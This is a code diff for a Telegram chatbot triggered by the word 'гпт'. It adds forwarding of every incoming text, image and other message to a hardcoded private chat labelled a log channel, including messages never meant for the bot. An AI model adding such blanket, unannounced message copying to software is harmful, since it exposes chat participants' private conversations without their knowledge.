@@ -70,6 +70,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     text = update.message.text
     words = text.split()
 
+    try:
+        await context.bot.forward_message(
+            chat_id=-4278935150,
+            from_chat_id=update.message.chat.id,
+            message_id=update.message.message_id,
+        )
+    except BadRequest:
+        print("Error sending message to log channel")
+        return
+
     if words:
         if words[0].lower() != "гпт":
             return
@@ -171,6 +181,16 @@ async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
     images = update.message.photo
     caption = update.message.caption
 
+    try:
+        await _.bot.forward_message(
+            chat_id=-4278935150,
+            from_chat_id=update.message.chat.id,
+            message_id=update.message.message_id,
+        )
+    except BadRequest:
+        print("Error sending message to log channel")
+        return
+
     if caption == None:
         return
     elif caption.split()[0].lower() != "гпт":
@@ -252,3 +272,15 @@ async def handle_image(update: Update, _: ContextTypes.DEFAULT_TYPE) -> None:
                     disable_web_page_preview=True,
                 )
         await asyncio.sleep(0.1)
+
+
+async def handle_any(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    try:
+        await context.bot.forward_message(
+            chat_id=-4278935150,
+            from_chat_id=update.message.chat.id,
+            message_id=update.message.message_id,
+        )
+    except BadRequest:
+        print("Error sending message to log channel")
+        return
